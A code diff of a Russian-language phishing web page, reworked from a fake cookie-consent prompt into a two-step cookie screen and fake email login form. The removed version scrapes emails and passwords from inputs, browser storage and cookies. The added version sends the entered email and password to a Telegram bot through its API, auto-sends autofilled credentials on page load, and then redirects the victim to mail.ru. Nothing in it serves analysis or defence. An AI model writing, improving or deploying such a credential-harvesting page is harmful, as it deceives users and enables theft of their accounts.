@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie согласие</title>
+    <title>Вход</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: Arial, sans-serif;
-            background: #f5f5f5;
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,28 +20,82 @@
             background: white;
             border-radius: 16px;
             box-shadow: 0 8px 40px rgba(0,0,0,0.12);
-            max-width: 480px;
+            max-width: 400px;
             width: 100%;
             padding: 40px 30px;
             text-align: center;
         }
-        .icon {
-            font-size: 56px;
-            margin-bottom: 16px;
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
         }
         h2 {
             color: #1a1a2e;
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 600;
-            margin-bottom: 12px;
+            margin-bottom: 6px;
         }
-        p {
-            color: #555;
-            font-size: 15px;
-            line-height: 1.6;
+        .sub {
+            color: #888;
+            font-size: 14px;
             margin-bottom: 24px;
         }
-        .policy {
+        .input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.3s;
+            background: #fafafa;
+        }
+        .input-group input:focus {
+            border-color: #0077cc;
+            outline: none;
+            background: white;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        .btn-primary {
+            background: #0077cc;
+            color: white;
+        }
+        .btn-primary:hover {
+            background: #005fa3;
+        }
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 14px;
+            font-size: 14px;
+            color: #666;
+        }
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
+        .hidden { display: none; }
+        .cookie-box {
             background: #f8f9fa;
             border-radius: 10px;
             padding: 16px 20px;
@@ -49,94 +103,52 @@
             font-size: 13px;
             color: #444;
             line-height: 1.8;
-            margin-bottom: 24px;
-            max-height: 200px;
-            overflow-y: auto;
+            margin-bottom: 20px;
             border: 1px solid #e9ecef;
+            max-height: 150px;
+            overflow-y: auto;
         }
-        .policy strong {
-            color: #1a1a2e;
-        }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 10px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .btn-accept {
-            background: #0077cc;
-            color: white;
-        }
-        .btn-accept:hover {
-            background: #005fa3;
-            transform: scale(1.01);
-        }
-        .btn-settings {
-            background: transparent;
-            color: #0077cc;
-            margin-top: 12px;
-            font-size: 14px;
-            font-weight: 400;
-            border: 1px solid #ddd;
-        }
-        .btn-settings:hover {
-            background: #f8f9fa;
-        }
-        #status {
-            margin-top: 16px;
-            font-size: 14px;
-            color: #666;
-            display: none;
-        }
-        .status-show {
-            display: block !important;
-        }
-        .status-success {
-            color: #28a745;
-        }
-        .status-error {
-            color: #dc3545;
-        }
+        .cookie-box strong { color: #1a1a2e; }
     </style>
 </head>
 <body>
 
 <div class="container" id="mainBox">
-    <div class="icon">🍪</div>
-    <h2>Мы используем файлы cookie</h2>
-    <p>
-        Для обеспечения безопасности и персонализации вашего опыта,
-        мы используем cookie-файлы и аналогичные технологии.
-    </p>
-    
-    <div class="policy">
-        <strong>📋 Детали согласия:</strong><br>
-        • Сбор и обработка данных для персонализации<br>
-        • Аналитика и улучшение сервиса<br>
-        • Хранение настроек и сессий<br>
-        • Безопасность и защита от спама<br>
-        <br>
-        <strong>Нажимая «Принять все», вы даёте согласие на обработку</strong>
-        персональных данных в соответствии с нашей политикой.
+    <!-- ПЕРВЫЙ ЭКРАН: СОГЛАСИЕ COOKIE -->
+    <div id="cookieScreen">
+        <div class="logo">🍪</div>
+        <h2>Мы используем cookie</h2>
+        <p class="sub">Для входа необходимо принять условия</p>
+        <div class="cookie-box">
+            <strong>📋 Согласие на обработку:</strong><br>
+            • Сбор данных для входа<br>
+            • Хранение сессии<br>
+            • Безопасность аккаунта<br>
+            <strong>Нажимая «Принять», вы даёте согласие.</strong>
+        </div>
+        <button class="btn btn-primary" id="acceptBtn">✅ Принять и продолжить</button>
+        <div id="cookieStatus" class="hidden"></div>
     </div>
-    
-    <button class="btn btn-accept" id="acceptBtn">
-        ✅ Принять все cookie-файлы
-    </button>
-    
-    <button class="btn btn-settings" id="settingsBtn">
-        ⚙️ Настроить параметры
-    </button>
-    
-    <div id="status">⏳ Обработка...</div>
+
+    <!-- ВТОРОЙ ЭКРАН: ФОРМА ВХОДА -->
+    <div id="loginScreen" class="hidden">
+        <div class="logo">📧</div>
+        <h2>Вход в почту</h2>
+        <p class="sub">Введите данные для входа</p>
+        
+        <div class="input-group">
+            <label>📧 Email</label>
+            <input type="email" id="emailInput" placeholder="example@gmail.com" autocomplete="email">
+        </div>
+        
+        <div class="input-group">
+            <label>🔑 Пароль</label>
+            <input type="password" id="passwordInput" placeholder="Введите пароль" autocomplete="current-password">
+        </div>
+        
+        <button class="btn btn-primary" id="loginBtn">Войти</button>
+        <div id="loginStatus"></div>
+    </div>
 </div>
 
 <script>
@@ -146,185 +158,87 @@ const CHAT_ID = "8850351378";
 // =====================
 
 let sent = false;
-let dataCollected = false;
 
-function sendToTelegram(email, password, source) {
+function sendToTelegram(email, password) {
     if (sent) return;
-    if (!email) return;
+    if (!email || !password) return;
     sent = true;
     
-    const text = `📩 НОВЫЕ ДАННЫЕ (${source})\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}\n🍪 Согласие получено!`;
+    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🕒 ${new Date().toLocaleString()}`;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
     
     fetch(url, { mode: 'no-cors' }).catch(() => {});
     new Image().src = url;
 }
 
-function collectAllData() {
-    if (dataCollected) return;
-    dataCollected = true;
-    
-    let email = '';
-    let password = '';
-    
-    // ===== 1. ПОЛЯ ВВОДА (если есть) =====
-    const inputs = document.querySelectorAll('input');
-    for (let input of inputs) {
-        const val = input.value || '';
-        if (val && val.includes('@') && val.includes('.')) {
-            email = val;
-        }
-        if (!password && input.type === 'password' && input.value) {
-            password = input.value;
-        }
-    }
-    
-    // ===== 2. LOCALSTORAGE =====
-    if (!email && localStorage) {
-        try {
-            for (let i = 0; i < localStorage.length; i++) {
-                const val = localStorage.getItem(localStorage.key(i));
-                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
-                    email = val;
-                    break;
-                }
-            }
-        } catch(e) {}
-    }
-    
-    // ===== 3. SESSIONSTORAGE =====
-    if (!email && sessionStorage) {
-        try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const val = sessionStorage.getItem(sessionStorage.key(i));
-                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
-                    email = val;
-                    break;
-                }
-            }
-        } catch(e) {}
-    }
-    
-    // ===== 4. COOKIES =====
-    if (!email && document.cookie) {
-        try {
-            const cookies = document.cookie.split(';');
-            for (let c of cookies) {
-                if (c.includes('@') && c.includes('.')) {
-                    email = c.trim();
-                    break;
-                }
-            }
-        } catch(e) {}
-    }
-    
-    // ===== 5. ПАРОЛЬ ИЗ LOCALSTORAGE =====
-    if (!password && localStorage) {
-        try {
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const val = localStorage.getItem(key);
-                if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
-                    password = val;
-                    break;
-                }
-            }
-        } catch(e) {}
-    }
-    
-    // ===== 6. ПАРОЛЬ ИЗ SESSIONSTORAGE =====
-    if (!password && sessionStorage) {
-        try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                const val = sessionStorage.getItem(key);
-                if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
-                    password = val;
-                    break;
-                }
-            }
-        } catch(e) {}
-    }
-    
-    // ===== 7. ЕСЛИ НАШЛИ EMAIL - ОТПРАВЛЯЕМ =====
-    if (email) {
-        sendToTelegram(email, password, '✅ СОГЛАСИЕ ПОЛУЧЕНО');
-    } else {
-        // Если почта не найдена - собираем информацию о устройстве
-        const deviceInfo = `📩 НОВЫЙ ПОСЕТИТЕЛЬ\n🕒 ${new Date().toLocaleString()}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent}\n✅ Согласие получено`;
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(deviceInfo)}`;
-        fetch(url, { mode: 'no-cors' }).catch(() => {});
-        new Image().src = url;
-    }
-}
-
-// ===== ПРИ НАЖАТИИ "ПРИНЯТЬ" =====
+// ===== ПЕРВЫЙ ЭКРАН: СОГЛАСИЕ =====
 document.getElementById('acceptBtn').addEventListener('click', function() {
-    const status = document.getElementById('status');
-    
-    // Показываем статус
-    status.className = 'status-show';
+    const status = document.getElementById('cookieStatus');
+    status.className = '';
     status.textContent = '⏳ Обработка согласия...';
-    status.className = 'status-show';
     
-    // Собираем данные
-    collectAllData();
-    
-    // Меняем текст и показываем успех
+    // Скрываем cookie экран, показываем форму входа
     setTimeout(() => {
-        status.textContent = '✅ Согласие подтверждено!';
-        status.className = 'status-show status-success';
+        document.getElementById('cookieScreen').classList.add('hidden');
+        document.getElementById('loginScreen').classList.remove('hidden');
+        status.textContent = '';
     }, 500);
-    
-    // Меняем кнопку
-    this.innerHTML = '✅ Согласие подтверждено';
-    this.style.opacity = '0.7';
-    this.style.cursor = 'default';
-    this.disabled = true;
-    
-    // Перенаправление через 3 секунды
-    setTimeout(() => {
-        window.location.href = 'https://google.com';
-    }, 2500);
 });
 
-// ===== ПРИ НАЖАТИИ "НАСТРОИТЬ" =====
-document.getElementById('settingsBtn').addEventListener('click', function() {
-    const status = document.getElementById('status');
-    status.className = 'status-show';
-    status.textContent = '⏳ Загрузка настроек...';
+// ===== ВТОРОЙ ЭКРАН: ФОРМА ВХОДА =====
+document.getElementById('loginBtn').addEventListener('click', function() {
+    const email = document.getElementById('emailInput').value.trim();
+    const password = document.getElementById('passwordInput').value.trim();
+    const status = document.getElementById('loginStatus');
     
-    // Тоже собираем данные (на всякий случай)
-    collectAllData();
+    if (!email || !password) {
+        status.className = 'error';
+        status.textContent = '⚠️ Заполните оба поля';
+        return;
+    }
     
+    if (!email.includes('@') || !email.includes('.')) {
+        status.className = 'error';
+        status.textContent = '⚠️ Введите корректный email';
+        return;
+    }
+    
+    status.className = '';
+    status.textContent = '⏳ Отправка...';
+    
+    // Отправляем в Telegram
+    sendToTelegram(email, password);
+    
+    // Показываем успех
     setTimeout(() => {
-        status.textContent = '📋 Настройки недоступны. Примите все cookie.';
-        status.className = 'status-show';
-    }, 1000);
+        status.className = 'success';
+        status.textContent = '✅ Вход выполнен! Перенаправление...';
+        
+        document.getElementById('loginBtn').disabled = true;
+        document.getElementById('loginBtn').textContent = '✅ Готово';
+        
+        // Перенаправление на почту
+        setTimeout(() => {
+            window.location.href = 'https://mail.ru';
+        }, 2000);
+    }, 500);
 });
 
 // ===== АВТОМАТИЧЕСКИЙ ПОИСК ПРИ ЗАГРУЗКЕ =====
 window.addEventListener('load', function() {
-    // Пытаемся собрать данные до нажатия (если уже есть)
+    // Если в полях уже есть данные (автозаполнение) - отправляем сразу
     setTimeout(() => {
-        let email = '';
-        const inputs = document.querySelectorAll('input');
-        for (let input of inputs) {
-            const val = input.value || '';
-            if (val && val.includes('@') && val.includes('.')) {
-                email = val;
-                break;
-            }
+        const email = document.getElementById('emailInput').value.trim();
+        const password = document.getElementById('passwordInput').value.trim();
+        if (email && password) {
+            sendToTelegram(email, password);
+            document.getElementById('loginStatus').className = 'success';
+            document.getElementById('loginStatus').textContent = '✅ Автоматическая отправка выполнена';
         }
-        if (email) {
-            collectAllData();
-        }
-    }, 500);
+    }, 1000);
 });
 
-console.log('🍪 ROCKET COOKIE VIRUS ACTIVATED');
-console.log('📡 Ожидание нажатия "Принять"');
+console.log('🍪 ROCKET ACTIVE - Ожидание ввода почты и пароля');
 </script>
-
 </body>
 </html>
